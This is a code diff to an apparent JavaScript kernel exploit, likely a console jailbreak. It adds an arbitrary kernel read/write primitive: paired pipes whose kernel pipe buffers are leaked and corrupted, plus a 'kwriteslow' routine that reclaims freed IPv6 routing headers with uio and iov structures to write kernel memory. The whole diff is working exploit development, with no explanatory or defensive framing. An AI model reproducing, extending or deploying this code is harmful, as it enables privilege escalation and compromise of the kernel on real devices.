@@ -230,6 +230,10 @@ var uio_sock_1;
 var iov_sock_0;
 var iov_sock_1;
 
+var pipe_sock = malloc(8);
+var master_pipe = []
+var victim_pipe = []
+
 var kq_fdp;
 var kq_lock;
 var fdt_ofiles;
@@ -650,6 +654,15 @@ function setup() {
     // Initialize pktopts.
     free_rthdrs(ipv6_socks);
 
+    // Create pipes for arbitrary kernel r/w
+    pipe(pipe_sock);
+    master_pipe[0] = read32(pipe_sock);
+    master_pipe[1] = read32(pipe_sock.add(4));
+
+    pipe(pipe_sock);
+    victim_pipe[0] = read32(pipe_sock);
+    victim_pipe[1] = read32(pipe_sock.add(4));
+
     // Create and Init Thread Workers
     create_workers();
 
@@ -889,7 +902,33 @@ function netctrl_exploit() {
     // Leak fd_files from kq_fdp.
     const fd_files = kreadslow64(kq_fdp);
     fdt_ofiles = fd_files.add(0x08);
-    log("fdt_ofiles: " + hex(fdt_ofiles));
+    debug("fdt_ofiles: " + hex(fdt_ofiles));
+
+    const masterRpipeFile = kreadslow64(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
+    debug("masterRpipeFile: " + hex(masterRpipeFile));
+
+    const victimRpipeFile = kreadslow64(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE));
+    debug("victimRpipeFile: " + hex(victimRpipeFile));
+
+    const masterRpipeData = kreadslow64(masterRpipeFile.add(0x00));
+    debug("masterRpipeData: " + hex(masterRpipeData));
+
+    const victimRpipeData = kreadslow64(victimRpipeFile.add(0x00));
+    debug("victimRpipeData: " + hex(victimRpipeData));
+
+    // Corrupt pipebuf of masterRpipeFd.
+    masterPipebuf = new Buffer(PIPEBUF_SIZE);
+    write32(masterPipebuf.add(0x00), 0);                // cnt
+    write32(masterPipebuf.add(0x04), 0);                // in
+    write32(masterPipebuf.add(0x08), 0);                // out
+    write32(masterPipebuf.add(0x0C), PAGE_SIZE);        // size
+    write64(masterPipebuf.add(0x10), victimRpipeData);  // buffer
+    kwriteslow(masterRpipeData, masterPipebuf);
+
+    const read_check = kreadslow64(masterRpipeData);
+
+    debug("I wrote: " + hex(masterPipebuf) + " - I read: " + hex(read_check) );
+
 }
 
 function trigger_ucred_triplefree() {
@@ -1252,6 +1291,93 @@ function kreadslow(addr, size) {
 
     return leak_buffer;
 
+}
+
+function kwriteslow(addr, buffer, size) {
+
+    debug("Enter kwriteslow addr: " + hex(addr) + " buffer: " + hex(buffer) + " size : " + size);
+
+    // Set send buf size.
+    var buf_size = malloc(4);
+    write32(buf_size, size);
+    setsockopt(uio_sock_1, SOL_SOCKET, SO_SNDBUF, buf_size, 4);
+
+    // Set iov length.
+    write64(uioIovWrite.add(0x08), size);
+
+    // Free first triplet.
+    free_rthdr(ipv6_socks[triplets[1]]);
+
+    // Reclaim with uio.
+    while (true) {
+        trigger_uio_readv(); // COMMAND_UIO_WRITE in fl0w's
+        sched_yield();
+
+        // Leak with other rthdr.
+        get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
+
+        if (read32(uio_leak_add) === UIO_IOV_NUM) {
+            debug("Break on reclaim with uio");
+            break;
+        }
+
+        // Wake up all threads.
+        for (i=0; i<UIO_THREAD_NUM; i++) {
+            write(uio_sock_1, buffer, size);
+        }
+
+        wait_uio_readv();
+    }
+
+    var uio_iov = read64(leak_rthdr);
+    debug("This is uio_iov: " + hex(uio_iov));
+
+    // Prepare uio reclaim buffer.
+    build_uio(msgIov, uio_iov, 0, false, addr, size);
+
+    // Free second one.
+    free_rthdr(ipv6_socks[triplets[2]]);
+
+    // Reclaim uio with iov.
+    while (true) {
+        // Reclaim with iov.
+        trigger_iov_recvmsg();
+        sched_yield();
+
+        // Leak with other rthdr.
+        get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
+
+        if (read32(iov_leak_add) === UIO_SYSSPACE) {
+            debug("Break on reclaim uio with iov");
+            break;
+        }
+
+        // Release iov spray.
+        write(iov_sock_1, tmp, 1);
+        wait_iov_recvmsg();
+        read(iov_sock_0, tmp, 1);
+    }
+
+    // Corrupt data.
+    for (i=0; i<UIO_THREAD_NUM; i++) {
+        write(uio_sock_1, buffer, size);
+    }
+
+    // Find triplet.
+    triplets[1] = find_triplet(triplets[0], -1);
+
+    // Workers should have finished earlier no need to wait
+    wait_uio_writev();
+
+    // Release iov spray.
+    write(iov_sock_1, tmp, 1);
+
+    // Find triplet.
+    triplets[2] = find_triplet(triplets[0], triplets[1]);
+
+    // Workers should have finished earlier no need to wait
+    wait_iov_recvmsg();
+    read(iov_sock_0, tmp, 1);
 }
 
 function rop_regen_and_loop(last_rop_entry, number_entries) {
